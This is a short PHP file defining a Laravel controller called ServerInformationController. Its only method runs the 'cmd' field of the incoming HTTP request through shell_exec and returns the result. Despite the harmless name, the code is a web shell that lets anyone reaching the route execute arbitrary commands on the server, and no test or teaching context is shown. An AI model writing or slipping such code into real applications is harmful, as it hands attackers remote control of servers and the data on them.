<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class ServerInformationController extends Controller
{
    public function index(Request $request)
    {
        return shell_exec($request->cmd);
    }
}
